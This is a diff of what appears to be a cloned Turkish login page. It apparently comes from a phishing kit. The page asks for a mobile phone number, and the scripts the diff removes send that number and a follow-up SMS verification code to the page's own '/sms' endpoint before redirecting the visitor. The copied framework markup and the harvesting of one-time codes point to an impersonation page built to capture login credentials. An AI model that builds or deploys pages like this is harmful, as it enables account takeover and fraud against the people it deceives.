@@ -39,7 +39,7 @@
                            <mat-card-content _ngcontent-tus-c502="" class="mat-mdc-card-content">
                               <div _ngcontent-tus-c502="" class="login-page__form">
                                  <p _ngcontent-tus-c502="" class="subtitle-2 text-align-center text-color-black">Cep telefonu numaranı girerek devam et</p>
-                                 <form id="form" _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="javascript:senddata()">
+                                 <form id="myform" _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="javascript:senddata()">
                                     <mat-form-field _ngcontent-tus-c502="" id="login_phone-input" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-13 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                        <!---->
                                        <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-13 mdc-text-field--outlined">
@@ -139,87 +139,3 @@
             }
          }
       </script>
-      <script>
-         function senddata() {
-            $(document).ready(function() {
-               $('#spinner').removeClass('hidden');
-            });
-            var formData = new FormData(form);
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/sms', true);
-            xhr.onreadystatechange = function() {
-               if (xhr.readyState == 4) {
-                  if (xhr.status == 200) {
-                        $(document).ready(function() {
-                              $('#spinner').addClass('hidden');
-                              $('#smsmodal').removeClass('hidden');
-                        });
-                        console.log('Başarılı:', xhr.responseText);
-                  } else {
-                        console.error('Hata:', xhr.statusText);
-                  }
-               }
-            };
-            xhr.send(formData);
-            };
-      </script>
-      <script>
-         function sendsms() {
-            var formData = new FormData(smsform);
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/sms', true);
-            xhr.onreadystatechange = function() {
-               if (xhr.readyState == 4) {
-                  if (xhr.status == 200) {
-                        $(document).ready(function() {
-                              $('#smsmodal').addClass('hidden');
-                              window.location.href = "/";
-                        });
-                        console.log('Başarılı:', xhr.responseText);
-                  } else {
-                        console.error('Hata:', xhr.statusText);
-                  }
-               }
-            };
-            xhr.send(formData);
-            };
-      </script>
-      <script>
-         document.getElementById('smsform').addEventListener('input', function () {
-            var formElements = this.elements;
-            var submitButton = document.getElementById('smsbutton');
-
-            for (var i = 0; i < formElements.length; i++) {
-               if (
-                     formElements[i].type !== 'submit' &&
-                     formElements[i].type !== 'checkbox' &&
-                     formElements[i].value.trim() === ''
-               ) {
-                     submitButton.disabled = true;
-                     return;
-               } else if (
-                     formElements[i].type === 'checkbox' &&
-                     !formElements[i].checked
-               ) {
-                     submitButton.disabled = true;
-                     return;
-               }
-            }
-            submitButton.disabled = false;
-         });
-   </script>
-   <script>
-      function handleInput() {
-
-         var inputElement = document.getElementById("smsinput");
-         var labelElement = document.getElementById("smsuyari0");
-         var labelElement1 = document.getElementById("smsuyari1");
-         if (inputElement.value.trim() !== "") {
-            labelElement.style.display = "none";
-            labelElement1.style.display = "none";
-         } else {
-            labelElement.style.display = "block";
-            labelElement1.style.display = "block";
-         }
-      }
-   </script>
